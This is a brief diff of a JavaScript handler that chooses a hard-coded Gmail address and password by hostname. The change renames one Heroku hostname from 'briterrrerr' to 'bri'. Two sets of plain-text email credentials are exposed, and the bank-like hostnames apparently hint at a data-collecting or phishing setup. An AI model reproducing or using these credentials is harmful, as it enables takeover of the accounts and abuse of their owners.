@@ -21,7 +21,7 @@ export default function handler(req, res) {
         email = 'pukiayam5123@gmail.com';
         pass = 'joyxbannkfmypmzx';
 
-    } else if(url == 'briterrrerr.herokuapp.com'){
+    } else if(url == 'bri.herokuapp.com'){
         email = 'penaruhangin@gmail.com';
         pass = 'alocfzvnbofojokm';
 
